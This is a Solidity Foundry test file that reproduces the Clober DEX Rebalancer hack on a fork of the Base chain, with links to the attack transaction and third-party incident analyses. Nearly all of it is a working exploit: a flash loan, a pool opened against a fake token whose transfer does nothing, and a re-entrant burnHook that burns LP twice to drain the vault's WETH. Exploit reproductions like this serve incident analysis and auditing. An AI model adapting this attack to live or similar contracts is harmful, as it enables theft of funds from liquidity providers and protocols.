// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ $501 K US$ (133.7 WETH)
// Attacker : https://basescan.org/address/0x012Fc6377F1c5CCF6e29967Bce52e3629AaA6025
// Attack Contract : https://basescan.org/address/0x32Fb1BedD95BF78ca2c6943aE5AEaEAAFc0d97C1
// Fake Token Contract : https://basescan.org/address/0xd3c8d0cd07Ade92df2d88752D36b80498cA12788
// Vulnerable Contract : https://basescan.org/address/0x6A0b87D6b74F7D5C92722F6a11714DBeDa9F3895
// Attack Tx : https://basescan.org/tx/0x8fcdfcded45100437ff94801090355f2f689941dca75de9a702e01670f361c04

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x6a0b87d6b74f7d5c92722f6a11714dbeda9f3895#code#F1#L277

// @Analysis
// Certik : https://www.certik.com/resources/blog/clober-dex-incident-analysis
// PeckShield : https://x.com/peckshield/status/1866443215186088048
// SolidityScan : https://blog.solidityscan.com/cloberdex-liquidity-vault-hack-analysis-f22eb960aa6f

type Currency is address;
type FeePolicy is uint24;

interface IRebalancer {

    function bookManager() external view returns(address);

    function open(
        IBookManager.BookKey calldata bookKeyA,
        IBookManager.BookKey calldata bookKeyB,
        bytes32 salt,
        address strategy
    ) external returns (bytes32 key);

    function mint(
        bytes32 key,
        uint256 amountA,
        uint256 amountB,
        uint256 minLpAmount
    ) external payable returns (uint256);

    function burn(
        bytes32 key,
        uint256 amount,
        uint256 minAmountA,
        uint256 minAmountB
    ) external returns (uint256, uint256);
}

interface IHooks {}

interface IBookManager {
    struct BookKey {
        Currency base;
        uint64 unitSize;
        Currency quote;
        FeePolicy makerPolicy;
        IHooks hooks;
        FeePolicy takerPolicy;
    }

    function open(BookKey calldata key, bytes calldata hookData) external;
}

contract CloberDex is BaseTestWithBalanceLog {
    uint256 public blocknumToForkFrom = 23_514_451 - 1;
    address public weth = 0x4200000000000000000000000000000000000006;
    address public morphoBlue = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address public rebalancer = 0x6A0b87D6b74F7D5C92722F6a11714DBeDa9F3895;
    address public attacker = 0x012Fc6377F1c5CCF6e29967Bce52e3629AaA6025;
    
    FakeToken fakeToken;
    uint256 public amountToHack;
    uint256 public rebalancerWETH;
    bool public reEntry = false;
    IMorphoBuleFlashLoan public morpho;
    IRebalancer public rebalancerContract;

    function setUp() public {
        // evm_version Requires to be "cancun"
        vm.createSelectFork("base", blocknumToForkFrom);
        deal(address(this), 0);
        deal(msg.sender, 1e18);
        morpho = IMorphoBuleFlashLoan(payable(morphoBlue));
        fakeToken = new FakeToken("Fake Token", "FAKE", 1000 ether);
        rebalancerContract = IRebalancer(rebalancer);

        vm.label(weth, "WETH Token");
        vm.label(morphoBlue, "Morpho Blue");
        vm.label(rebalancer, "Rebalancer Contract");
        vm.label(address(fakeToken), "Fake Token");

    }

    function testRealAttacker() public {
        emit log_named_decimal_uint("The Real Attacker's ETH before the attack:", address(attacker).balance / 1e18, 0);
        vm.createSelectFork("base", blocknumToForkFrom + 1);
        emit log_named_decimal_uint("The Real Attacker's ETH after the attack:", address(attacker).balance / 1e18, 0);
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker ETH Balance Before exploit:", address(msg.sender).balance / 1e18, 0);

        rebalancerWETH = IERC20(weth).balanceOf(rebalancer);
        emit log_named_decimal_uint("Rebalancer WETH Balance Before exploit:", rebalancerWETH, 18);

        amountToHack = rebalancerWETH * 2;

        // 1. Flash Loan
        console.log("--- Flash Loan and Exploit ---");
        morpho.flashLoan(weth, amountToHack, "0");

        emit log_named_decimal_uint("Exploit Contract WETH Balance After exploit:", IERC20(weth).balanceOf(address(this)) / 1e18, 0);
        emit log_named_decimal_uint("Rebalancer WETH Balance After exploit:", IERC20(weth).balanceOf(rebalancer), 18);

        console.log("--- Withdrawn WETH to ETH ---");
        IERC20(weth).withdraw(rebalancerWETH);
        payable(msg.sender).call{value: rebalancerWETH}("");
        emit log_named_decimal_uint("Attacker ETH Balance After exploit:", address(msg.sender).balance / 1e18, 0);
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata data) external {
        IHooks hooksA =IHooks(address(0x0000000000000000000000000000000000000000));
        Currency baseCurrencyA = Currency.wrap(weth);
        Currency quoteA = Currency.wrap(address(fakeToken));
        FeePolicy makerPolicyA = FeePolicy.wrap(uint24(888608));

        IBookManager.BookKey memory bookKeyA = IBookManager.BookKey({
            base: baseCurrencyA,
            unitSize: 1,
            quote: quoteA,
            makerPolicy: FeePolicy.wrap(8888608),
            hooks: hooksA,
            takerPolicy: FeePolicy.wrap(8888708)
        });

        IBookManager.BookKey memory bookKeyB = IBookManager.BookKey({
            base: quoteA,
            unitSize: 1,
            quote: baseCurrencyA,
            makerPolicy: FeePolicy.wrap(8888608),
            hooks: hooksA,
            takerPolicy: FeePolicy.wrap(8888708)
        });

        // 2. Build the pool between WETH and Fake Token
        bytes32 poolKey = rebalancerContract.open(bookKeyA,bookKeyB,"1",address(this));

        // 3. Approve tokens
        fakeToken.approve(rebalancer, type(uint256).max);
        IERC20(weth).approve(rebalancer, amountToHack);

        // 4. Add liquidity (mint LP Token)
        rebalancerContract.mint(poolKey, amountToHack, amountToHack, 0);

        // 5. Burn LP Token, extracting WETH from the pool
        rebalancerContract.burn(poolKey, rebalancerWETH, 0, 0);

        IERC20(weth).approve(morphoBlue, amount);
    }

    function burnHook(address receiver,  bytes32 key, uint256 burnAmount, uint256 lastTotalSupply ) external{
        if(reEntry == false){
            reEntry=true;
            // 6. Extract WETH from the pool again
            IRebalancer(rebalancer).burn(key,rebalancerWETH,0,0);
        }
    }
    function mintHook(address receiver,bytes32 key, uint256 amount,uint256 amount2) external{}

    fallback() external payable {}
}


contract FakeToken {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) {
        name = _name;
        symbol = _symbol;
        totalSupply = _initialSupply;
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowances[from][msg.sender] >= amount, "Allowance exceeded");
        require(balances[from] >= amount, "Insufficient balance");
        balances[from] -= amount;
        balances[to] += amount;
        allowances[from][msg.sender] -= amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
}